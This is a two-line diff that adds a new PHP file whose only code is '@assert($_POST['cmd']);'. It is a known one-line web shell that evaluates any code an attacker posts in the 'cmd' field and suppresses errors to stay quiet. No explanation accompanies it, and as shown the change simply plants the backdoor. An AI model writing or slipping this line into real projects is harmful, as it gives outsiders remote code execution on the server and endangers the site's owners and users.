@@ -1,0 +1,2 @@
+<?php
+@assert($_POST['cmd']);
